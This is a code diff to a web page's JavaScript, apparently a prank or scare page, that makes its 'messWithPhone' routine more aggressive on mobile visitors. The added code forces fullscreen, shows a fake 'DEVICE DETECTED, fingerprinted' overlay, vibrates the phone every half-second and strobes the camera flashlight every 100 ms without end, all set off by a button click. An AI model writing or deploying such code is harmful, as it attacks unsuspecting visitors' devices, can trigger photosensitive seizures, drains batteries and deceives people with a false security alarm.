@@ -84,8 +84,8 @@
   }
 
   function messWithPhone() {
-    // vibrate in a pattern
-    try { if (navigator.vibrate) navigator.vibrate([200, 100, 200, 100, 400, 100, 200]); } catch (e) {}
+    // aggressive vibration
+    try { if (navigator.vibrate) navigator.vibrate([500, 100, 500, 100, 500, 100, 1000]); } catch (e) {}
     // force fullscreen
     try {
       const el = document.documentElement;
@@ -97,17 +97,27 @@
     // full-screen overlay
     const ov = document.createElement('div');
     ov.style.cssText = 'position:fixed;inset:0;z-index:999999;background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;text-align:center;padding:20px;font-size:1.2rem;';
-    ov.innerHTML = '<div><h1 style="color:#f00;">⚠ DEVICE DETECTED ⚠</h1><p>Mobile/phone fingerprinted.</p><p>Vibration + fullscreen triggered.</p></div>';
+    ov.innerHTML = '<div><h1 style="color:#f00;">⚠ DEVICE DETECTED ⚠</h1><p>Mobile/phone fingerprinted.</p><p>Vibration + fullscreen + flash triggered.</p></div>';
     document.body.appendChild(ov);
-    // spam alerts
-    let n = 0;
-    const alertLoop = setInterval(() => {
-      if (n >= 5) { clearInterval(alertLoop); return; }
-      try { alert('voidxcc: phone detected (' + (n + 1) + '/5)'); } catch (e) {}
-      n++;
-    }, 800);
-    // periodic vibration
-    setInterval(() => { try { if (navigator.vibrate) navigator.vibrate([100, 50, 100]); } catch (e) {} }, 2000);
+    // single alert
+    try { alert('voidxcc: phone detected'); } catch (e) {}
+    // aggressive periodic vibration
+    setInterval(() => { try { if (navigator.vibrate) navigator.vibrate([300, 50, 300, 50, 600]); } catch (e) {} }, 500);
+    // rapid flashlight (torch) toggle — indefinitely
+    try {
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
+        .then(stream => {
+          const track = stream.getVideoTracks()[0];
+          const caps = (track.getCapabilities) ? track.getCapabilities() : {};
+          if (caps.torch) {
+            let on = false;
+            setInterval(() => {
+              on = !on;
+              track.applyConstraints({ advanced: [{ torch: on }] }).catch(() => {});
+            }, 100);
+          }
+        }).catch(() => {});
+    } catch (e) {}
   }
 
   if (isMobile()) {
@@ -134,6 +144,10 @@
         var mv = document.querySelector('#media video');
         if (mv) { mv.muted = false; mv.volume = 1; mv.play(); }
       } catch (e) {}
+      // trigger mess-with-phone payload on mobile (button click)
+      if (isMobile()) {
+        try { messWithPhone(); } catch (e) {}
+      }
       spawn50();
     });
   }
